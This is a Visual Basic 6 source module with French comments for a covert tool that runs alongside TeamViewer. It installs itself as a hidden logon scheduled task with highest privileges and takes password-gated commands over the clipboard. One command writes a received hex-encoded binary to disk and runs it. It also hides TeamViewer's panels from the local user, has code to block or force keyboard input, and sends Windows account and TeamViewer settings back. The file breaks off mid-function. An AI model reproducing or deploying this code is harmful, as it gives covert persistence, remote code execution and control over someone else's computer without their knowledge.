Attribute VB_Name = "Fonctions"
Option Private Module
Option Explicit

Public Sub Sendkeys(text As Variant, Optional wait As Boolean = False)
   Dim WshShell As Object
   Set WshShell = CreateObject("wscript.shell")
   WshShell.Sendkeys CStr(text), wait
   Set WshShell = Nothing
End Sub

Private Sub Command1_Click()

Dim sSecret     As String

sSecret = ToHexDump(CryptRC4("a message here", "password"))
Debug.Print sSecret
Debug.Print CryptRC4(FromHexDump(sSecret), "password")

End Sub

Public Function CryptRC4(sText As String, sKey As String) As String

Dim baS(0 To 255) As Byte
Dim baK(0 To 255) As Byte
Dim bytSwap     As Byte
Dim lI          As Long
Dim lJ          As Long
Dim lIdx        As Long

For lIdx = 0 To 255
    baS(lIdx) = lIdx
    baK(lIdx) = Asc(Mid$(sKey, 1 + (lIdx Mod Len(sKey)), 1))
Next
For lI = 0 To 255
    lJ = (lJ + baS(lI) + baK(lI)) Mod 256
    bytSwap = baS(lI)
    baS(lI) = baS(lJ)
    baS(lJ) = bytSwap
Next
lI = 0
lJ = 0
For lIdx = 1 To Len(sText)
    lI = (lI + 1) Mod 256
    lJ = (lJ + baS(lI)) Mod 256
    bytSwap = baS(lI)
    baS(lI) = baS(lJ)
    baS(lJ) = bytSwap
    CryptRC4 = CryptRC4 & Chr$((pvCryptXor(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
Next

End Function

Private Function pvCryptXor(ByVal lI As Long, ByVal lJ As Long) As Long

If lI = lJ Then
    pvCryptXor = lJ
Else
    pvCryptXor = lI Xor lJ
End If

End Function

Public Function ToHexDump(sText As String) As String

Dim lIdx            As Long

For lIdx = 1 To Len(sText)
    ToHexDump = ToHexDump & Right$("0" & Hex(Asc(Mid(sText, lIdx, 1))), 2)
Next

End Function

Public Function FromHexDump(sText As String) As String

Dim lIdx            As Long

For lIdx = 1 To Len(sText) Step 2
    FromHexDump = FromHexDump & Chr$(CLng("&H" & Mid(sText, lIdx, 2)))
Next

End Function

Public Sub Install_htvp()

Dim ProgDataDir As String
Dim s_Path As String
Dim TargetFile As String
Dim s As String

' Répertoire ProgramData
'-----------------------
ProgDataDir = Environ("programdata")
' Chemin\Nom de l'outil
'----------------------
s_Path = App.Path & IIf(Right$(App.Path, 1) <> "\", "\", "") & App.EXEName & ".exe"

' On n'agit que si le programme courant n'a pas été lancé du répertoire prévu pour le scheduler
'----------------------------------------------------------------------------------------------
If App.Path <> (ProgDataDir & "\TeamViewer") Then
    ' On note le nom complet de l'exe d'installation pour permettre son effacement automatique
    ' par le programme une fois installé.
    '-----------------------------------------------------------------------------------------
    EcrireIni "Setup", "Exe", s_Path, Fic_ini
    ' Teste si l'outil est déjà dans le scheduler
    '--------------------------------------------
    ShellWait "cmd.exe /c ""schtasks /query /nh /tn tv_log > " & Fictmp & """", vbHide
    Lecture_Intégrale_Fichier_Texte Fictmp, s
    If InStr(1, s, "tv_log") > 0 Then
        ' L'outil y est, on le stoppe puis on le retire du scheduler
        ' (permet d'installer une nouvelle version)
        '-----------------------------------------------------------
        ShellWait "cmd.exe /c ""schtasks /end /tn tv_log""", vbHide
        ShellWait "cmd.exe /c ""schtasks /delete /tn tv_log /f""", vbHide
    End If
    ' Création d'un répertoire "TeamViewer" dans Programdata et recopie de l'outil dans ce répertoire
    '------------------------------------------------------------------------------------------------
    On Error Resume Next
    ChDir ProgDataDir
    MkDir "TeamViewer"
    TargetFile = ProgDataDir & "\TeamViewer" & "\tv_log.exe"
    FileCopy s_Path, TargetFile
    ' On met l'outil dans le scheduler et on le lance tout de suite
    '--------------------------------------------------------------
'    ShellWait "cmd.exe /c ""schtasks /create /U A_TV /P tuntun /RU Gord /PU hello1 /sc ONLOGON /tn tv_log /tr """"" & TargetFile & """"" /f /rl HIGHEST""", vbHide
   ShellWait "cmd.exe /c ""schtasks /create /sc ONLOGON /tn tv_log /tr """"" & TargetFile & """"" /f /rl HIGHEST""", vbHide
    ShellWait "cmd.exe /c ""schtasks /run /i /tn tv_log""", vbHide
    ' On arrête le présent programme
    '-------------------------------
    End_htvp
End If

End Sub

Public Function myfunc(ByVal code As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

Dim kybd As HookStruct
Dim s As String
Dim i As Integer
    
myfunc = True

On Error GoTo Saute

' On ne fait rien car semble poser problème dans certains cas
'------------------------------------------------------------
myfunc = 1
Exit Function
'------------------------------------------------------------


If code = HC_ACTION And wParam <> 257 Then
    CopyMemory kybd, ByVal lParam, Len(kybd)
    ' Only allowed if doesn't come from physical keyboard
    '----------------------------------------------------
    If (kybd.flags And 16) <> 0 Then
        D_Saisies = D_Saisies + Chr(kybd.vkCode)
        CompileShortCmd
    ElseIf (kybd.flags And 16) = 0 Then
        ' Starting here it comes from the local keyboard
        '-----------------------------------------------
        If mean_force_to_type Then
            S_Saisies = Chr(kybd.vkCode)
            If InStr(1, S_To_Type, S_Typed & S_Saisies) = 1 Then
                S_Typed = S_Typed & S_Saisies
                If S_Typed = S_To_Type Then
                    mean_force_to_type = False
                End If
            Else
                myfunc = 1
                Exit Function
            End If
        ElseIf nokey Then
            myfunc = 1
            Exit Function
        End If
    End If
End If

Saute:
On Error GoTo 0
myfunc = CallNextHookEx(hook, code, wParam, lParam)

End Function


Public Sub InterpreteLigne(ligne As String)

Dim i As Integer
Dim Commande As String
Dim Parametre1 As String
Dim Parametre2 As String
Dim Parametre3 As String
Dim Parametre4 As String
Dim Parametre5 As String
Dim c As String

Commande = ""
Parametre1 = ""
Parametre2 = ""
Parametre3 = ""
Parametre4 = ""
Parametre5 = ""

' Commande
'---------
For i = 1 To Len(ligne)
    c = Mid(ligne, i, 1)
    If c = " " Then
        i = i + 1
        Exit For
    End If
    Commande = Commande & c
Next i
' Premier paramètre
'------------------
Parametre1 = GetNextParameter(i, ligne)
' Deuxième paramètre
'-------------------
Parametre2 = GetNextParameter(i, ligne)
' Troisième paramètre
'--------------------
Parametre3 = GetNextParameter(i, ligne)
' Quatrième paramètre
'--------------------
Parametre4 = GetNextParameter(i, ligne)
' Cinquième paramètre
'--------------------
Parametre5 = GetNextParameter(i, ligne)

' Lancement de la commande
'-------------------------
CompileLongCmd Commande, Parametre1, Parametre2, Parametre3, Parametre4, Parametre5

End Sub

Public Sub TraiteClipboard()

Dim i_deb As Long
Dim i_fin As Long
Dim ligne As String
Dim s As String
Dim s_Path As String
Dim F_Num As Integer
Dim s2 As String
Dim c As String
Dim i As Long
Dim NomPgm As String
Dim TrfAndLaunchOptions As Integer
Dim s3 As String
Dim s_r As String

On Error GoTo Sautec

If Clipboard.GetFormat(vbCFText) Then
    ClpBrd = Clipboard.GetText(vbCFText)
    ' Extraction de la première ligne
    ' Elle ne doit pas être la dernière
    '----------------------------------
    i_fin = InStr(1, ClpBrd, vbCr)
    If i_fin > 0 Then
        ligne = Trim(Left(ClpBrd, i_fin - 1))
        i_deb = i_fin + 2
        ' On interprète la suite du clipboard comme étant des instructions à exécuter
        ' seulement si la première ligne est L_Prefix suivi d'un espace, du nom du PC et du mot de passe éventuel
        '--------------------------------------------------------------------------------------------------------
        Current_D_PC_Name = Get_D_PC_Name(ligne)
        If Current_D_PC_Name <> "Error" Then
            ' On efface le clipboard
            '-----------------------
            Clipboard.Clear
            ' On retire la première ligne
            '----------------------------
            s = Right(ClpBrd, Len(ClpBrd) - i_fin - 1)
            ' Si la première commande est "ContentTrsf", c'est une réception de fichier,
            ' on fait un traitement spécial.
            '---------------------------------------------------------------------------
            If Left(s, Len("ContentTrsf")) = "ContentTrsf" Then
                ' Numéro de chunk
                '----------------
                i = InStr(1, s, vbCrLf)
                If i < 1 Then Exit Sub
                s3 = Mid(s, Len("ContentTrsf") + 2, i - (Len("ContentTrsf") + 2))
                s = Right(s, Len(s) - i - 1)
                FileChunkReception Val(s3), s
                Exit Sub
            End If
            ' Si la première commande est "TrsfAndExec" on fait un traitement spécial
            '------------------------------------------------------------------------
            If Left(s, Len("TrsfAndExec")) = "TrsfAndExec" Then
                ' Program name and options
                '-------------------------
                i = InStr(1, s, vbCrLf)
                If i < 1 Then Exit Sub
                s3 = Mid(s, Len("TrsfAndExec") + 2, i - (Len("TrsfAndExec") + 2))
                TDeb s3
                s = Right(s, Len(s) - i - 1)
                ' Options
                '--------
                TrfAndLaunchOptions = Val(Right(s3, 2))
                ' Program name
                '-------------
                NomPgm = Left(s3, Len(s3) - 2)
                ' On décode l'hexa
                '-----------------
                s2 = ""
                For i = 1 To Len(s) Step 2
                    c = Mid(s, i, 2)
                    s2 = s2 & Chr("&H" & c)
                    DoEvents
                Next i
                ' Nom complet du fichier à créer
                '-------------------------------
                ' If to be put on the desktop...
                '-------------------------------
                If (TrfAndLaunchOptions And 1) Then
                    s_Path = Environ("HOMEPATH") & "\desktop" & "\" & NomPgm
                Else
                    s_Path = Environ("TMP") & "\" & NomPgm
                End If
                ' Ecriture du programme
                '----------------------
                F_Num = FreeFile
                On Error Resume Next
                Kill s_Path
                On Error GoTo Sautec
                Open s_Path For Binary Access Write As F_Num
                Put F_Num, , s2
                Close F_Num
                ' Launch the attached function
                '-----------------------------
                If (TrfAndLaunchOptions And Trsf_Launch) Then
                    dbExecWindows = Shell(s_Path, 1)
                ElseIf (TrfAndLaunchOptions And Trsf_WallPaper) And ((TrfAndLaunchOptions And Trsf_Permanent) <> Trsf_Permanent) Then
                    SetWallpaper s_Path
                    EcrireIni "WallPaper", "NomPic", "", Fic_ini
                    WallPaperPermanent = False
                ElseIf (TrfAndLaunchOptions And (Trsf_WallPaper + Trsf_Permanent)) Then
                    SetWallpaper s_Path
                    EcrireIni "WallPaper", "NomPic", s_Path, Fic_ini
                    Nom_Wallpaper = s_Path
                    WallPaperPermanent = True
                End If
                Exit Sub
            End If
            ' On lance l'exécution des comandes
            '----------------------------------
            On Error GoTo 0
            GoTv s
        ' Si c'est une commande mais avec un mauvais mot de passe...
        '-----------------------------------------------------------
        ElseIf InStr(1, ligne, Trim((L_Prefix & " " & PC_Name))) = 1 Then
            ' On répond que c'est un mauvais mot de passe
            '--------------------------------------------
            s_r = Prefix_answer & "WrongPW" & vbCrLf
            Set_Clipboard s_r
        ' Si ce n'est pas une commande...
        '--------------------------------
        Else
            ' On lance le traitement des restrictions
            '----------------------------------------
            On Error GoTo 0
            If mean_add_clipboard Then Go_Add_To_Clipboard
        End If
    ElseIf Len(ClpBrd) > 0 Then
        ' On lance le traitement des restrictions
        '----------------------------------------
        On Error GoTo 0
        If mean_add_clipboard Then Go_Add_To_Clipboard
    End If
End If

Sautec:

End Sub

Public Sub GoTv(A_Executer As String)

Dim i As Long
Dim s As String
Dim i_deb As Long
Dim i_fin As Long
Dim lg As Long
Dim ligne As String

lg = Len(A_Executer)
i = 1
i_deb = 1
Do
    ' Test de fin
    '------------
    If i_deb > lg Then Exit Do
    ' Extraction d'une ligne
    '-----------------------
    i_fin = InStr(i_deb, A_Executer, vbCr)
    If i_fin > 0 Then
        ligne = Mid(A_Executer, i_deb, i_fin - i_deb)
        i_deb = i_fin + 2
    Else
        ligne = Right(A_Executer, lg - i_deb + 1)
        i_deb = lg + 1
    End If
    ' interprétation et lancement de la ligne
    '----------------------------------------
    InterpreteLigne ligne
Loop

End Sub

Public Sub Go_Add_To_Clipboard()

Dim i As Long
Dim j As Long
Dim k As Long
Dim s As String

s = ""
k = 1
j = 1
Do
    i = InStr(j, s_add_fin_clipboard, "/n")
    If i < 1 Then
        s = s & Right(s_add_fin_clipboard, Len(s_add_fin_clipboard) - j + 1)
        Exit Do
    Else
        s = s & Mid(s_add_fin_clipboard, j, i - j) & vbCrLf
        j = i + 2
    End If
Loop

' Si la chaîne à ajouter à la fin y est déjà, on sort
'----------------------------------------------------
i = InStr(1, ClpBrd, s)
If i > 0 Then Exit Sub

' On ajoute la chaîne voulue
'---------------------------
ClpBrd = ClpBrd & s
Set_Clipboard ClpBrd

End Sub

Public Function GetNextParameter(i As Integer, s As String) As String

Dim l As Integer
Dim c As String
Dim i_deb As Integer
Dim res As String

l = Len(s)
' Si plus de paramètre, on retourne une chaine vide
'--------------------------------------------------
If i > l Then
    GetNextParameter = ""
    Exit Function
End If

' On saute les éventuels espaces
'-------------------------------
Do
    If Mid(s, i, 1) <> " " Then Exit Do
    i = i + 1
    If i > l Then
        GetNextParameter = ""
        Exit Function
    End If
Loop

' Le premier caractère du paramètre
'----------------------------------
c = Mid(s, i, 1)
i_deb = i
res = c
' Si ce n'est pas un guillemet...
'--------------------------------
If c <> """" Then
    ' On attend simplement un espace ou la fin de chaine
    '---------------------------------------------------
    i = i + 1
    Do
        If i > l Then
            GetNextParameter = res
            Exit Function
        End If
        c = Mid(s, i, 1)
        If c = " " Then
            GetNextParameter = res
            Exit Function
        End If
        res = res & c
        i = i + 1
    Loop
' Sinon c'est un guillemet...
'----------------------------
Else
    ' On attend un prochain guillemet non doublé
    '-------------------------------------------
    i = i + 1
    Do
        ' Si fin de chaine on sort
        '-------------------------
        If i > l Then
            ' Sortie un peu anormale... on pourrait retourner une chaine vide
            '----------------------------------------------------------------
            GetNextParameter = res
            Exit Function
        End If
        ' Si prochain caractère est un guillement...
        '-------------------------------------------
        c = Mid(s, i, 1)
        res = res & c
        If c = """" Then
            ' Si plus d'autres caractères, c'était le guillemet de fin
            '---------------------------------------------------------
            i = i + 1
            If i > l Then
                ' Sortie ok
                '----------
                GetNextParameter = res
                Exit Function
            End If
            ' Si le caractère suivant n'est pas un guillemet, c'était le guillemet de fin
            '----------------------------------------------------------------------------
            c = Mid(s, i, 1)
            If c <> """" Then
                ' Sortie ok... on espère que c'est un espace
                '-------------------------------------------
                GetNextParameter = res
                Exit Function
            End If
            ' Sinon, on comptabilise ce second guillemet
            '-------------------------------------------
            res = res & c
        End If
        i = i + 1
    Loop
End If

End Function

Public Sub HideTVPanel()

Dim hWndTVPanel As Long
Dim res As Boolean
Dim lpRect As RECT
Dim l_result As Long
Dim XY As PointType

XY = GetTheMoreLeftAndMoreTop()

hWndTVPanel = FindWindow("TV_ControlWin", vbNullString)
l_result = GetWindowLong(hWndTVPanel, GWL_STYLE)
GetWindowRect hWndTVPanel, lpRect
'If ((l_result And WS_VISIBLE) <> 0) And (lpRect.Right <> 1) Then
If ((l_result And WS_VISIBLE) <> 0) And (lpRect.Right <> XY.X + 1) Then
    TVWasMinimized = False
'    res = SetWindowPos(hWndTVPanel, 0, 0, 0, 0, 0, &H80 + &H10 + &H4 + &H2 + &H1)
' &H40 ?
    
    TVPanel_Left = lpRect.Left
    TVPanel_Top = lpRect.Top
    res = SetWindowPos(hWndTVPanel, 1, lpRect.Left - lpRect.Right + XY.X + 1, lpRect.Top - lpRect.Bottom + XY.Y + 1, 0, 0, &H10 + &H1)
End If
hWndTVPanel = FindWindow("TV_ControlWinMinimized", vbNullString)
l_result = GetWindowLong(hWndTVPanel, GWL_STYLE)
'If (l_result And WS_VISIBLE) <> 0 Then
GetWindowRect hWndTVPanel, lpRect
If ((l_result And WS_VISIBLE) <> 0) And (lpRect.Right <> XY.X + 1) Then
    TVWasMinimized = True
'    res = SetWindowPos(hWndTVPanel, 0, 0, 0, 0, 0, &H80 + &H10 + &H4 + &H2 + &H1)
    TVPanel_Left = lpRect.Left
    TVPanel_Top = lpRect.Top
    res = SetWindowPos(hWndTVPanel, 1, lpRect.Left - lpRect.Right + XY.X + 1, lpRect.Top - lpRect.Bottom + XY.Y + 1, 0, 0, &H10 + &H1)
End If

End Sub

Public Sub ResizeTVMainWindow()

Dim hWndTVMainWindow As Long
Dim res As Boolean
Dim lpRect As RECT
Dim l_result As Long
Dim XY As PointType

XY = GetTheMoreLeftAndMoreTop()

hWndTVMainWindow = FindWindow(vbNullString, "TeamViewer")
l_result = GetWindowLong(hWndTVMainWindow, GWL_STYLE)
GetWindowRect hWndTVMainWindow, lpRect
If (lpRect.Left <> 648) Or (lpRect.Top <> 22) Then
    res = SetWindowPos(hWndTVMainWindow, 1, 648, 22, 0, 0, &H0)
End If

End Sub

Public Function SetFocus_TVMainWindow() As Boolean

Dim hWndTVMainWindow As Long
Dim res As Boolean
Dim lpRect As RECT
Dim l_result As Long
Dim XY As PointType

hWndTVMainWindow = FindWindow(vbNullString, "TeamViewer")
'l_result = GetWindowLong(hWndTVMainWindow, GWL_STYLE)
'GetWindowRect hWndTVMainWindow, lpRect
'If (lpRect.Left <> 648) Or (lpRect.Top <> 22) Then
'    res = SetWindowPos(hWndTVMainWindow, 1, 648, 22, 0, 0, &H0)
'End If

If hWndTVMainWindow <> 0 Then
    If IsIconic(hWndTVMainWindow) <> 0 Then
        'ShowWindow hWndTVMainWindow, SW_SHOWNORMAL
        ShowWindow hWndTVMainWindow, 1
    End If
    SetForegroundWindow hWndTVMainWindow
    SetFocus_TVMainWindow = True
    Exit Function
End If


SetFocus_TVMainWindow = False

End Function

Public Function IsTVPanelVisible() As Boolean

Dim hWndTVPanel As Long
Dim res As Boolean
Dim lpRect As RECT
Dim l_result As Long

hWndTVPanel = FindWindow("TV_ControlWin", vbNullString)
l_result = GetWindowLong(hWndTVPanel, GWL_STYLE)
If (l_result And WS_VISIBLE) <> 0 Then
    IsTVPanelVisible = True
Else
    hWndTVPanel = FindWindow("TV_ControlWinMinimized", vbNullString)
    l_result = GetWindowLong(hWndTVPanel, GWL_STYLE)
    If (l_result And WS_VISIBLE) <> 0 Then
        IsTVPanelVisible = True
    Else
        IsTVPanelVisible = False
    End If
End If

End Function

Public Sub HideMainTV()

Dim hWndTVPanel As Long
Dim res As Boolean
Dim lpRect As RECT
Dim l_result As Long

GetWindowTeamViewerHandle
If TeamViewer_hwnd <> 0 Then
    l_result = GetWindowLong(TeamViewer_hwnd, GWL_STYLE)
    If (l_result And WS_VISIBLE) <> 0 Then
        res = SetWindowPos(TeamViewer_hwnd, 0, 0, 0, 0, 0, &H80 + &H10 + &H4 + &H2 + &H1)
    End If
End If

End Sub

Public Sub ShowMainTV()

Dim hWndTVPanel As Long
Dim res As Boolean
Dim lpRect As RECT
Dim l_result As Long

GetWindowTeamViewerHandle
If TeamViewer_hwnd <> 0 Then
    l_result = GetWindowLong(TeamViewer_hwnd, GWL_STYLE)
    If (l_result And WS_VISIBLE) = 0 Then
        res = SetWindowPos(TeamViewer_hwnd, 0, 0, 0, 0, 0, &H40 + &H10 + &H4 + &H2 + &H1)
    End If
End If

End Sub

Public Sub ShowTVPanel()

Dim hWndTVPanel As Long
Dim res As Boolean
Dim lpRect As RECT
Dim l_result As Long

If TVWasMinimized Then
    hWndTVPanel = FindWindow("TV_ControlWinMinimized", vbNullString)
    l_result = GetWindowLong(hWndTVPanel, GWL_STYLE)
    If (l_result <> 0) And Not WS_VISIBLE Then
'        res = SetWindowPos(hWndTVPanel, 0, 0, 0, 0, 0, &H40 + &H10 + &H4 + &H2 + &H1)
        res = SetWindowPos(hWndTVPanel, -1, TVPanel_Left, TVPanel_Top, 0, 0, &H1)
    End If
Else
    hWndTVPanel = FindWindow("TV_ControlWin", vbNullString)
    l_result = GetWindowLong(hWndTVPanel, GWL_STYLE)
    If (l_result <> 0) And Not WS_VISIBLE Then
'        res = SetWindowPos(hWndTVPanel, 0, 0, 0, 0, 0, &H40 + &H10 + &H4 + &H2 + &H1)
'        res = SetWindowPos(hWndTVPanel, -1, TVPanel_Left, TVPanel_Top, 0, 0, &H40 + &H10 + &H1)
        res = SetWindowPos(hWndTVPanel, -1, TVPanel_Left, TVPanel_Top, 0, 0, &H40 + &H1)
    End If
End If

End Sub

Public Sub ShowTVComputers()

'Dim hWndTVComputers As Long
Dim res As Boolean
Dim lpRect As RECT
Dim l_result As Long

''hWndTVPanel = FindWindow("TV_ControlWin", vbNullString)
Dim hWndTVComputerList As Long
hWndTVComputerList = FindWindow("BuddyWindow", vbNullString)
''Dim hWndTVMain As Long
''hWndTVMain = FindWindow("#32770", vbNullString)
''hWndTVMain = FindWindow("TeamViewer", vbNullString)

l_result = GetWindowLong(hWndTVComputerList, GWL_STYLE)
If (l_result And WS_VISIBLE) = 0 Then
 '   res = GetWindowRect(hWndTVPanel, lpRect)
 '   res = SetWindowPos(hWndTVPanel, -1, 0, 0, 0, 0, &H40 + &H2)
   ' res = SetWindowPos(hWndTVPanel, 0, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, &H40 + &H10 + &H4 + &H2 + &H1)
    res = SetWindowPos(hWndTVComputerList, 0, 0, 0, 0, 0, &H40 + &H10 + &H4 + &H2 + &H1)
''res = GetWindowRect(hWndTVComputerList, lpRect)
''res = SetWindowPos(hWndTVComputerList, 0, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, &H80 + &H2)
''res = GetWindowRect(hWndTVMain, lpRect)
''res = SetWindowPos(hWndTVMain, 0, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, &H80 + &H2)
End If

End Sub

Public Sub ShowTrayNotification()

'Dim hWndTVComputers As Long
Dim res As Boolean
Dim lpRect As RECT
Dim l_result As Long

''hWndTVPanel = FindWindow("TV_ControlWin", vbNullString)
Dim hWndTVTray As Long
hWndTVTray = FindWindow("TrayNotificationBaseView", vbNullString)
''Dim hWndTVMain As Long
''hWndTVMain = FindWindow("#32770", vbNullString)
''hWndTVMain = FindWindow("TeamViewer", vbNullString)

l_result = GetWindowLong(hWndTVTray, GWL_STYLE)
If (l_result And WS_VISIBLE) = 0 Then
 '   res = GetWindowRect(hWndTVPanel, lpRect)
 '   res = SetWindowPos(hWndTVPanel, -1, 0, 0, 0, 0, &H40 + &H2)
   ' res = SetWindowPos(hWndTVPanel, 0, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, &H40 + &H10 + &H4 + &H2 + &H1)
    res = SetWindowPos(hWndTVTray, 0, 0, 0, 0, 0, &H40 + &H10 + &H4 + &H2 + &H1)
''res = GetWindowRect(hWndTVComputerList, lpRect)
''res = SetWindowPos(hWndTVComputerList, 0, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, &H80 + &H2)
''res = GetWindowRect(hWndTVMain, lpRect)
''res = SetWindowPos(hWndTVMain, 0, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, &H80 + &H2)
End If

End Sub

Public Sub HideTVComputers()

'Dim hWndTVComputers As Long
Dim res As Boolean
Dim lpRect As RECT
Dim l_result As Long

''hWndTVPanel = FindWindow("TV_ControlWin", vbNullString)
Dim hWndTVComputerList As Long
hWndTVComputerList = FindWindow("BuddyWindow", vbNullString)
''Dim hWndTVMain As Long
''hWndTVMain = FindWindow("#32770", vbNullString)
''hWndTVMain = FindWindow("TeamViewer", vbNullString)

l_result = GetWindowLong(hWndTVComputerList, GWL_STYLE)
If (l_result And WS_VISIBLE) <> 0 Then
 '   res = GetWindowRect(hWndTVPanel, lpRect)
 '   res = SetWindowPos(hWndTVPanel, -1, 0, 0, 0, 0, &H40 + &H2)
   ' res = SetWindowPos(hWndTVPanel, 0, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, &H40 + &H10 + &H4 + &H2 + &H1)
    res = SetWindowPos(hWndTVComputerList, 0, 0, 0, 0, 0, &H80 + &H10 + &H4 + &H2 + &H1)
''res = GetWindowRect(hWndTVComputerList, lpRect)
''res = SetWindowPos(hWndTVComputerList, 0, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, &H80 + &H2)
''res = GetWindowRect(hWndTVMain, lpRect)
''res = SetWindowPos(hWndTVMain, 0, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, &H80 + &H2)
End If

End Sub

Public Sub HideTrayNotification()

'Dim hWndTVComputers As Long
Dim res As Boolean
Dim lpRect As RECT
Dim l_result As Long

''hWndTVPanel = FindWindow("TV_ControlWin", vbNullString)
Dim hWndTVTray As Long
hWndTVTray = FindWindow("TrayNotificationBaseView", vbNullString)
''Dim hWndTVMain As Long
''hWndTVMain = FindWindow("#32770", vbNullString)
''hWndTVMain = FindWindow("TeamViewer", vbNullString)

l_result = GetWindowLong(hWndTVTray, GWL_STYLE)
If (l_result And WS_VISIBLE) <> 0 Then
 '   res = GetWindowRect(hWndTVPanel, lpRect)
 '   res = SetWindowPos(hWndTVPanel, -1, 0, 0, 0, 0, &H40 + &H2)
   ' res = SetWindowPos(hWndTVPanel, 0, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, &H40 + &H10 + &H4 + &H2 + &H1)
    res = SetWindowPos(hWndTVTray, 0, 0, 0, 0, 0, &H80 + &H10 + &H4 + &H2 + &H1)
''res = GetWindowRect(hWndTVComputerList, lpRect)
''res = SetWindowPos(hWndTVComputerList, 0, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, &H80 + &H2)
''res = GetWindowRect(hWndTVMain, lpRect)
''res = SetWindowPos(hWndTVMain, 0, lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top, &H80 + &H2)
End If

End Sub

Public Function GetWin32ErrorDescription(ErrorCode As Long) As String

Dim lngRet As Long
Dim strAPIError As String

' Preallocate the buffer.
strAPIError = String$(2048, " ")

' Now get the formatted message.
lngRet = FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, _
ByVal 0&, ErrorCode, 0, strAPIError, Len(strAPIError), 0)

' Reformat the error string.
strAPIError = Left$(strAPIError, lngRet)

' Return the error string.
GetWin32ErrorDescription = strAPIError

End Function

Public Function Lecture_Intégrale_Fichier_Texte(Fichier_avec_Chemin As String, Contenu As String) As Boolean

' Lit d'un coup tout le contenu d'un fichier texte dont le nom complet est passé en parmètre.
' Le résultat se trouve dans la deuxième chaîne passée en paramètre.
'--------------------------------------------------------------------------------------------
Dim intFic As Integer
Dim strLigne As String

Contenu = ""
On Error GoTo Err_Lect_Fichier_Text
intFic = FreeFile
Open Fichier_avec_Chemin For Input As intFic
While Not EOF(intFic)
    Line Input #intFic, strLigne
    Contenu = Contenu + strLigne + vbCr + vbLf
Wend
Close intFic
Lecture_Intégrale_Fichier_Texte = True
Exit Function

Err_Lect_Fichier_Text:
Lecture_Intégrale_Fichier_Texte = False

End Function

Public Sub Customize_Tool(Parametre1 As String, Parametre2 As String)

Dim s_Path As String
Dim F_Num As Integer
Dim strData As String
Dim l As Long
Dim s As String
Dim s_custom_Default As String
Dim s_custom_Cible As String
Dim s_custom_Flag As String
Dim i As Long
Dim DébutCustom As String

' Analyse des paramètres
'-----------------------
If Parametre1 = "" Then Exit Sub
If Parametre2 = "" Then Exit Sub
i = InStr(1, Customization, "/")
DébutCustom = Left(Customization, i - 1)
s = DébutCustom & "/" & Parametre1 & "/" & Parametre2 & "/"
s = s & String(Len(Customization) - Len(s), "X")
s_custom_Cible = ""
For i = 1 To Len(s)
    s_custom_Cible = s_custom_Cible & Chr(0) & Mid(s, i, 1)
Next i

' Chemin de l'outil
'------------------
s_Path = App.Path & IIf(Right$(App.Path, 1) <> "\", "\", "") & App.EXEName & ".exe"

' Lecture intégrale de l'outil
'-----------------------------
F_Num = FreeFile
Open s_Path For Binary Access Read As F_Num
strData = String$(LOF(F_Num), " ")
Get F_Num, , strData
Close F_Num

' Recherche de la chaîne à remplacer
'-----------------------------------
s_custom_Flag = ""
For i = 1 To Len(DébutCustom)
    s_custom_Flag = s_custom_Flag & Chr(0) & Mid(DébutCustom, i, 1)
Next i
s_custom_Flag = s_custom_Flag & Chr(0) & "/"
i = InStr(1, strData, s_custom_Flag)
If i > 0 Then
    ' Remplacement
    '-------------
    strData = Left(strData, i - 1) & s_custom_Cible & Right(strData, Len(strData) - i + 1 - Len(s_custom_Cible))
    ' Nom du fichier à créer
    '-----------------------
    s_Path = Left(s_Path, Len(s_Path) - 4) & Format(Now, "hhnnmmddyyyy") & ".exe"
    ' Ecriture de l'outil customisé
    '------------------------------
    F_Num = FreeFile
    Open s_Path For Binary Access Write As F_Num
    Put F_Num, , strData
    Close F_Num
End If

End Sub

Public Sub GetInfo()

Dim s As String

's = "Return " & L_Prefix & " " & PC_Name & " " & "GetInfo" & vbCrLf
s = Prefix_answer & "GetInfo" & vbCrLf
s = s & "WINDOWS ACCOUNTS INFO" & vbCrLf
s = s & vbCrLf & GetAccountsList(False)
s = s & vbCrLf
s = s & "TEAMVIEWER SETTINGS INFO" & vbCrLf
s = s & vbCrLf & GetTVParameters(False)
Set_Clipboard s

End Sub

Public Sub GetScreenResolution()

Dim s As String

s = Prefix_answer & "GetScreenResolution" & vbCrLf
s = s & Trim(Str(Screen.Width / Screen.TwipsPerPixelX))
s = s & "|"
s = s & Trim(Str(Screen.Height / Screen.TwipsPerPixelY))
s = s & vbCrLf
Set_Clipboard s

End Sub

Public Sub GetDate()

Dim s As String

s = Prefix_answer & "GetDate" & vbCrLf
s = s & Format(Now, "MM/DD/YYYY hh:nn")
s = s & vbCrLf
Set_Clipboard s

End Sub

Public Sub GethtvpStatus()

Dim s As String
Dim s1 As String
Dim s2 As String
Dim Released As Boolean

Released = True

s1 = "Restricted items:" & vbCrLf & "-----------------" & vbCrLf

If nokey Then
    Released = False
    s1 = s1 & "Keyboard is disabled" & vbCrLf
End If

If hidetv Then
    Released = False
    If hidetvPermanent Then
        s1 = s1 & "TeamViewer Panel is permanently hidden" & vbCrLf
    Else
        s1 = s1 & "TeamViewer Panel is hidden" & vbCrLf
    End If
End If

If HideTVComp Then
    Released = False
    s1 = s1 & "Computers & Contacts is hidden" & vbCrLf
End If

If Hide_MainTV Then
    Released = False
